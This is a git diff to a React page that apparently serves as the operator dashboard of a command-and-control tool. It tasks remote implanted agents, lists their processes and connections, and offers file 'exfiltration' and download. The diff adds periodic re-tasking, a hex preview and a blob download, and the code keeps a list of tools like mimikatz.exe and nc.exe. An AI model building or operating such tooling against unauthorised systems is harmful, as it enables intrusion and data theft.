@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useRef, useCallback } from 'react';
+import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
 import { 
   Terminal as TerminalIcon, 
@@ -11,7 +11,6 @@ import {
   CheckCircle2,
   AlertCircle,
   FileText,
-  Activity,
   Trash2,
   Zap,
   Folder,
@@ -25,7 +24,8 @@ import {
   ShieldCheck,
   ShieldAlert,
   Bomb,
-  Download
+  Download,
+  Activity as ActivityIcon
 } from 'lucide-react';
 import { agentsApi, tasksApi } from '../utils/api';
 import { format, formatDistanceToNow } from 'date-fns';
@@ -49,6 +49,9 @@ const AgentDetailPage = () => {
   const [lastClearedResultId, setLastClearedResultId] = useState(() => {
     return localStorage.getItem(`clear_id_${id}`);
   });
+  const [isMonitoring, setIsMonitoring] = useState(false);
+  const [prevPsList, setPrevPsList] = useState([]);
+  const [prevNetList, setPrevNetList] = useState([]);
   const lastResultsLength = useRef(0);
   const resultEndRef = useRef(null);
 
@@ -121,17 +124,7 @@ const AgentDetailPage = () => {
     };
   }, [fetchDetails]);
 
-  useEffect(() => {
-    const newLength = (data?.results?.length || 0) + pendingTasks.length;
-    if (newLength > lastResultsLength.current) {
-      if (autoScroll && activeTab === 'console') {
-        resultEndRef.current?.scrollIntoView({ behavior: 'smooth' });
-      }
-      lastResultsLength.current = newLength;
-    }
-  }, [data?.results, pendingTasks.length, autoScroll, activeTab]);
-
-  const handleQuickAction = async (type, payload) => {
+  const handleQuickAction = useCallback(async (type, payload) => {
     const targetType = type === 'ls' ? 'ls_json' : type;
     try {
       const result = await tasksApi.create(id, targetType, payload);
@@ -152,7 +145,32 @@ const AgentDetailPage = () => {
     } catch (err) {
       alert(err.message);
     }
-  };
+  }, [id, fetchDetails]);
+
+  // Real-Time Heartbeat Monitor
+  useEffect(() => {
+    if (!isMonitoring) return;
+
+    const monitor = setInterval(() => {
+      if (activeTab === 'processes') {
+        handleQuickAction('ps_json', {});
+      } else if (activeTab === 'network') {
+        handleQuickAction('netstat_json', {});
+      }
+    }, 5000);
+
+    return () => clearInterval(monitor);
+  }, [isMonitoring, activeTab, id, handleQuickAction]);
+
+  useEffect(() => {
+    const newLength = (data?.results?.length || 0) + pendingTasks.length;
+    if (newLength > lastResultsLength.current) {
+      if (autoScroll && activeTab === 'console') {
+        resultEndRef.current?.scrollIntoView({ behavior: 'smooth' });
+      }
+      lastResultsLength.current = newLength;
+    }
+  }, [data?.results, pendingTasks.length, autoScroll, activeTab]);
 
   const handleExfiltrate = async (file) => {
     try {
@@ -265,7 +283,6 @@ const AgentDetailPage = () => {
       const fullPath = res.output.replace('FILE_EXFILTRATED:', '');
       const filename = fullPath.split(/[\\/]/).pop().split('_').slice(1).join('_');
       const fileBasename = fullPath.split(/[\\/]/).pop();
-      const downloadUrl = `${window.location.origin}/exfiltrated/${id}/${fileBasename}`;
       
       return (
         <div className="p-4 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-between group">
@@ -279,7 +296,27 @@ const AgentDetailPage = () => {
             </div>
           </div>
           <button 
-            onClick={() => window.open(downloadUrl)}
+            onClick={async () => {
+              try {
+                const response = await tasksApi.download(id, fileBasename);
+                if (!response.ok) {
+                  const errorData = await response.json().catch(() => ({}));
+                  throw new Error(errorData.error || `Server returned ${response.status}`);
+                }
+                const blob = await response.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                window.URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+              } catch (err) {
+                console.error('Download error:', err);
+                alert(`Download failed: ${err.message}`);
+              }
+            }}
             className="px-6 py-2.5 rounded-xl bg-primary text-white text-[10px] font-black uppercase tracking-[0.2em] hover:bg-primary-hover transition-all shadow-lg shadow-primary/20"
           >
             Download to Local
@@ -293,8 +330,29 @@ const AgentDetailPage = () => {
       const payload = typeof res.task_payload === 'string' ? JSON.parse(res.task_payload) : (res.task_payload || {});
       const fileName = payload.path ? payload.path.split(/[\\/]/).pop() : 'Binary File';
       
+      // Generate a hex preview of the first 256 bytes (or whatever is in the output)
+      const generateHexPreview = (text) => {
+        const hex = [];
+        const chars = [];
+        const maxLen = Math.min(text.length, 256);
+        
+        for (let i = 0; i < maxLen; i++) {
+          const charCode = text.charCodeAt(i);
+          hex.push(charCode.toString(16).padStart(2, '0').toUpperCase());
+          chars.push(charCode >= 32 && charCode <= 126 ? text[i] : '.');
+        }
+        
+        const rows = [];
+        for (let i = 0; i < hex.length; i += 16) {
+          const hexRow = hex.slice(i, i + 16).join(' ');
+          const charRow = chars.slice(i, i + 16).join('');
+          rows.push(`${(i).toString(16).padStart(8, '0')}  ${hexRow.padEnd(47)}  |${charRow}|`);
+        }
+        return rows.join('\n');
+      };
+
       return (
-        <div className="p-6 rounded-2xl bg-amber-500/10 border border-amber-500/20 flex flex-col gap-4">
+        <div className="p-6 rounded-2xl bg-amber-500/10 border border-amber-500/20 flex flex-col gap-6">
           <div className="flex items-center gap-4">
             <div className="p-3 bg-amber-500/20 rounded-xl text-amber-500">
               <AlertCircle className="w-6 h-6" />
@@ -304,6 +362,14 @@ const AgentDetailPage = () => {
               <div className="text-sm font-bold text-white">Console cannot render raw binary data for: {fileName}</div>
             </div>
           </div>
+
+          <div className="space-y-2">
+             <div className="text-[9px] font-black text-slate-500 uppercase tracking-widest pl-1">Hex Intelligence Preview (First 256 Bytes)</div>
+             <pre className="p-4 bg-black/60 rounded-xl border border-slate-800/50 font-mono text-[10px] text-emerald-500/80 leading-relaxed overflow-x-auto shadow-inner">
+               {generateHexPreview(output)}
+             </pre>
+          </div>
+
           <div className="flex gap-3">
             <button 
               onClick={() => handleExfiltrate({ name: fileName })}
@@ -312,7 +378,7 @@ const AgentDetailPage = () => {
               <Download className="w-3.5 h-3.5" /> Full Exfiltration
             </button>
             <div className="flex-1 p-3 bg-black/40 rounded-xl font-mono text-[10px] text-slate-500 border border-slate-800">
-              PDF/Binary data detected. Use exfiltration to retrieve the full asset for local analysis.
+              Binary data detected. Use exfiltration to retrieve the full asset for local analysis.
             </div>
           </div>
         </div>
@@ -326,41 +392,78 @@ const AgentDetailPage = () => {
     );
   };
 
-  if (loading && !data) {
+  const psList = useMemo(() => {
+    const results = data?.results || [];
+    const res = [...results].reverse().find(r => r.task_type === 'ps_json' && r.status === 'success');
+    try { return res ? JSON.parse(res.output) : null; } catch { return null; }
+  }, [data?.results]);
+
+  const netList = useMemo(() => {
+    const results = data?.results || [];
+    const res = [...results].reverse().find(r => r.task_type === 'netstat_json' && r.status === 'success');
+    try { return res ? JSON.parse(res.output) : null; } catch { return null; }
+  }, [data?.results]);
+
+  useEffect(() => {
+    if (psList) {
+      setPrevPsList(curr => {
+        if (JSON.stringify(curr) !== JSON.stringify(psList)) {
+          return curr.length === 0 ? psList : curr;
+        }
+        return curr;
+      });
+    }
+  }, [psList]);
+
+  useEffect(() => {
+    if (netList) {
+      setPrevNetList(curr => {
+        if (JSON.stringify(curr) !== JSON.stringify(netList)) {
+          return curr.length === 0 ? netList : curr;
+        }
+        return curr;
+      });
+    }
+  }, [netList]);
+
+  if (!data) {
     return (
-      <div className="h-full flex items-center justify-center">
-        <Loader2 className="w-8 h-8 text-primary animate-spin" />
+      <div className="h-full flex items-center justify-center bg-[#05070a]">
+        {loading ? (
+          <div className="flex flex-col items-center gap-4">
+            <Loader2 className="w-8 h-8 text-primary animate-spin" />
+            <p className="text-[10px] font-black text-slate-500 uppercase tracking-[0.3em]">Synchronizing Intelligence...</p>
+          </div>
+        ) : (
+          <div className="flex flex-col items-center gap-6 p-12 rounded-3xl bg-red-500/5 border border-red-500/10">
+            <AlertCircle className="w-12 h-12 text-red-500/50" />
+            <div className="text-center">
+              <h3 className="text-white font-bold mb-2">Intelligence Retrieval Failed</h3>
+              <p className="text-xs text-slate-500 max-w-xs">Unable to establish secure link with node. The asset may be offline or the session has expired.</p>
+            </div>
+            <button 
+              onClick={() => navigate('/agents')}
+              className="px-6 py-2.5 rounded-xl bg-slate-900 border border-slate-800 text-slate-300 text-[10px] font-black uppercase tracking-widest hover:bg-slate-800 transition-all"
+            >
+              Return to Command Center
+            </button>
+          </div>
+        )}
       </div>
     );
   }
 
   const { agent, results } = data;
 
-  const getLatestPsResult = () => {
-    const psRes = [...results].reverse().find(r => r.task_type === 'ps_json' && r.status === 'success');
-    if (!psRes) return null;
-    try {
-      return JSON.parse(psRes.output);
-    } catch {
-      return null;
-    }
-  };
+
+  const getLatestPsResult = () => psList;
+  const getLatestNetstatResult = () => netList;
 
   const getLatestLsResult = () => {
     const lsRes = [...results].reverse().find(r => r.task_type === 'ls_json' && r.status === 'success');
     if (!lsRes) return null;
     try {
       return JSON.parse(lsRes.output);
-    } catch {
-      return null;
-    }
-  };
-
-  const getLatestNetstatResult = () => {
-    const netRes = [...results].reverse().find(r => r.task_type === 'netstat_json' && r.status === 'success');
-    if (!netRes) return null;
-    try {
-      return JSON.parse(netRes.output);
     } catch {
       return null;
     }
@@ -460,7 +563,7 @@ const AgentDetailPage = () => {
                 {[
                   { label: 'OS Platform', value: agent.os, icon: Monitor },
                   { label: 'Architecture', value: agent.arch, icon: Cpu },
-                  { label: 'Process ID', value: agent.pid, icon: Activity },
+                  { label: 'Process ID', value: agent.pid, icon: ActivityIcon },
                   { label: 'Integrity', value: 'Level 4 (System)', icon: ShieldCheck },
                 ].map((item, i) => (
                   <div key={i} className="flex items-center justify-between p-3 rounded-xl bg-slate-900/40 border border-slate-800/50 group hover:border-primary/20 transition-all">
@@ -815,12 +918,23 @@ const AgentDetailPage = () => {
                   <div>
                     <span className="text-sm font-bold text-white block leading-none">Process Manager</span>
                     <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">
-                      {getLatestPsResult() ? `${getLatestPsResult().filter(p => p.name.toLowerCase().includes(psSearchQuery.toLowerCase())).length} Active` : 'Scanning...'}
+                      {psList ? `${psList.filter(p => p.name.toLowerCase().includes(psSearchQuery.toLowerCase())).length} Active` : 'Scanning...'}
                     </span>
                   </div>
                 </div>
 
                 <div className="flex items-center gap-6">
+                  <button
+                    onClick={() => setIsMonitoring(!isMonitoring)}
+                    className={`px-4 py-2 rounded-xl border flex items-center gap-3 transition-all ${
+                      isMonitoring 
+                        ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
+                        : 'bg-slate-900 border-slate-800 text-slate-500 grayscale'
+                    }`}
+                  >
+                    <div className={`w-2 h-2 rounded-full ${isMonitoring ? 'bg-emerald-500 animate-pulse' : 'bg-slate-700'}`} />
+                    <span className="text-[10px] font-black uppercase tracking-widest">Tactical Monitor</span>
+                  </button>
                   <div className="flex-1 max-w-sm relative">
                     <input 
                       type="text" 
@@ -878,9 +992,10 @@ const AgentDetailPage = () => {
                           const isSelf = Number(proc.pid) === Number(agent.pid);
                           const suspiciousBinaries = ['cmd.exe', 'powershell.exe', 'pwsh.exe', 'mimikatz.exe', 'wireshark.exe', 'nc.exe', 'nmap.exe', 'schtasks.exe', 'reg.exe', 'wmic.exe'];
                           const isSuspicious = suspiciousBinaries.some(b => proc.name.toLowerCase().includes(b));
+                          const isNew = isMonitoring && !prevPsList.some(p => p.pid === proc.pid);
                           
                           return (
-                            <tr key={proc.pid} className={`hover:bg-white/5 transition-colors group ${isSelf ? 'bg-primary/5' : isSuspicious ? 'bg-red-500/5' : ''}`}>
+                            <tr key={proc.pid} className={`hover:bg-white/5 transition-colors group ${isSelf ? 'bg-primary/5' : isSuspicious ? 'bg-red-500/5' : ''} ${isNew ? 'bg-emerald-500/5 border-l-2 border-emerald-500' : ''}`}>
                               <td className={`px-5 py-2.5 font-mono font-bold ${isSelf ? 'text-primary' : isSuspicious ? 'text-red-400' : 'text-slate-500'}`}>
                                 {proc.pid}
                               </td>
@@ -1062,7 +1177,7 @@ const AgentDetailPage = () => {
                                   {file.is_dir ? <Folder className="w-3.5 h-3.5" /> : 
                                    ['exe', 'dll', 'bat', 'sh', 'ps1'].includes(file.name.split('.').pop().toLowerCase()) ? <TerminalIcon className="w-3.5 h-3.5" /> :
                                    ['txt', 'log', 'config', 'json', 'yaml', 'ini'].includes(file.name.split('.').pop().toLowerCase()) ? <FileText className="w-3.5 h-3.5" /> :
-                                   <Activity className="w-3.5 h-3.5" />}
+                                   <ActivityIcon className="w-3.5 h-3.5" />}
                                 </div>
                                 <span className={`font-semibold ${file.is_dir ? 'text-slate-200' : 'text-slate-400'}`}>
                                   {file.name}
@@ -1142,7 +1257,20 @@ const AgentDetailPage = () => {
                   </div>
                 </div>
 
-                <div className="flex-1 max-w-sm relative">
+                <div className="flex items-center gap-6">
+                  <button
+                    onClick={() => setIsMonitoring(!isMonitoring)}
+                    className={`px-4 py-2 rounded-xl border flex items-center gap-3 transition-all ${
+                      isMonitoring 
+                        ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
+                        : 'bg-slate-900 border-slate-800 text-slate-500 grayscale'
+                    }`}
+                  >
+                    <div className={`w-2 h-2 rounded-full ${isMonitoring ? 'bg-emerald-500 animate-pulse' : 'bg-slate-700'}`} />
+                    <span className="text-[10px] font-black uppercase tracking-widest">Tactical Monitor</span>
+                  </button>
+                  
+                  <div className="flex-1 max-w-sm relative">
                   <input 
                     type="text" 
                     placeholder="Search IPs or Ports..."
@@ -1159,9 +1287,10 @@ const AgentDetailPage = () => {
                   className="px-3 py-1.5 rounded-lg bg-primary text-white text-[10px] font-bold uppercase tracking-wider hover:bg-primary-hover transition-all flex items-center gap-2"
                 >
                   <RefreshCw className={`w-3 h-3 ${pendingTasks.some(t => t.task_type === 'netstat_json') ? 'animate-spin' : ''}`} />
-                  {pendingTasks.some(t => t.task_type === 'netstat_json') ? 'Scanning' : 'Refresh'}
-                </button>
-              </div>
+                {pendingTasks.some(t => t.task_type === 'netstat_json') ? 'Scanning' : 'Refresh'}
+              </button>
+            </div>
+          </div>
               
               <div className="flex-1 overflow-y-auto scrollbar-thin">
                 <table className="w-full text-left text-[11px] border-collapse">
@@ -1181,8 +1310,10 @@ const AgentDetailPage = () => {
                           c.remote.includes(netSearchQuery) || 
                           c.state.toLowerCase().includes(netSearchQuery.toLowerCase())
                         )
-                        .map((conn, idx) => (
-                          <tr key={idx} className="hover:bg-white/5 transition-colors group">
+                        .map((conn, idx) => {
+                          const isNew = isMonitoring && !prevNetList.some(p => p.local === conn.local && p.remote === conn.remote && p.proto === conn.proto);
+                          return (
+                            <tr key={idx} className={`hover:bg-white/5 transition-colors group ${isNew ? 'bg-emerald-500/5 border-l-2 border-emerald-500' : ''}`}>
                             <td className="px-5 py-3">
                               <span className={`px-1.5 py-0.5 rounded text-[9px] font-black tracking-widest ${
                                 conn.proto === 'TCP' ? 'bg-primary/10 text-primary' : 'bg-purple-500/10 text-purple-400'
@@ -1212,7 +1343,8 @@ const AgentDetailPage = () => {
                               </span>
                             </td>
                           </tr>
-                        ))
+                        );
+                      })
                     ) : (
                       <tr>
                         <td colSpan="4" className="py-20 text-center">
@@ -1243,7 +1375,7 @@ const AgentDetailPage = () => {
           >
             {toast.type === 'success' ? <CheckCircle2 className="w-5 h-5" /> : 
              toast.type === 'error' ? <AlertCircle className="w-5 h-5" /> : 
-             <Activity className="w-5 h-5" />}
+             <ActivityIcon className="w-5 h-5" />}
             <span className="text-xs font-bold uppercase tracking-wider">{toast.title}</span>
           </div>
         ))}
@@ -1252,14 +1384,5 @@ const AgentDetailPage = () => {
   );
 };
 
-const MetaRow = ({ icon, label, value }) => (
-  <div className="flex items-center justify-between group">
-    <div className="flex items-center gap-3 text-slate-500 group-hover:text-slate-300 transition-colors">
-      {icon}
-      <span className="text-[10px] font-bold uppercase tracking-widest">{label}</span>
-    </div>
-    <span className="text-xs font-bold text-white group-hover:text-primary transition-colors">{value}</span>
-  </div>
-);
 
 export default AgentDetailPage;
